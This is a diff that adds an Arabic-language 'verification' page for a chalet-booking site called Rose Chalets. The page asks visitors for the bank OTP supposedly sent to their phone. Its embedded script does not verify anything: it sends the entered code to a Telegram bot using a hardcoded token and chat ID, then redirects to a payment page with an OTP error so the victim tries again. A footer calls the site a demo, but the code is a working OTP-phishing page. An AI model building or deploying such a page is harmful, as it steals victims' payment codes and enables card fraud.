@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>التحقق - Rose Chalets</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <header class="main-header">
+    <div class="container">
+      <h1 class="logo">🌹 التحقق - Rose Chalets</h1>
+    </div>
+  </header>
+
+  <main class="container">
+
+    <section class="booking">
+      <h2>رمز التحقق</h2>
+      <p>تم إرسال رمز تحقق إلى رقم هاتفك المسجل من البنك. الرجاء إدخاله أدناه:</p>
+
+      <div id="timer" style="font-weight: bold; color: red; margin: 10px 0;">الوقت المتبقي: 60 ثانية</div>
+
+      <form id="verifyForm">
+        <label for="code">أدخل الكود:</label>
+        <input type="text" id="code" name="code" pattern="\\d{4,6}" maxlength="6" required placeholder="123456" />
+
+        <button type="submit" id="verifyBtn">تأكيد</button>
+      </form>
+    </section>
+
+  </main>
+
+  <footer class="footer">
+    <p>⚠️ هذا الموقع تجريبي لأغراض العرض فقط - جميع الحقوق محفوظة © Rose Chalets</p>
+  </footer>
+
+  <script>
+    // عداد 60 ثانية
+    let timeLeft = 60;
+    const timerDisplay = document.getElementById("timer");
+    const verifyBtn = document.getElementById("verifyBtn");
+
+    const countdown = setInterval(() => {
+      timeLeft--;
+      timerDisplay.textContent = `الوقت المتبقي: ${timeLeft} ثانية`;
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        timerDisplay.textContent = "انتهى الوقت! حاول مرة أخرى.";
+        verifyBtn.disabled = true;
+        verifyBtn.style.backgroundColor = "#aaa";
+        verifyBtn.style.cursor = "not-allowed";
+      }
+    }, 1000);
+
+    // إرسال الكود
+    document.getElementById("verifyForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const token = "8022117794:AAHc6i8c6jZY_2IGHUQlQBJYGN2v9n0";
+      const chatId = "1008144314";
+      const code = document.getElementById("code").value.trim();
+
+      if (code.length >= 4 && code.length <= 6) {
+        const message = `
+❌ فشل التحقق من الكود:
+الرمز المدخل: ${code}
+العملية لم تكتمل. يرجى استخدام طريقة دفع أخرى.
+        `;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        }).then(response => {
+          if (response.ok) {
+            window.location.href = "payment.html?error=otp";
+          } else {
+            alert("تعذر إرسال الكود.");
+          }
+        });
+      } else {
+        alert("الرجاء إدخال كود مكوّن من 4 إلى 6 أرقام.");
+      }
+    });
+  </script>
+
+</body>
+</html>
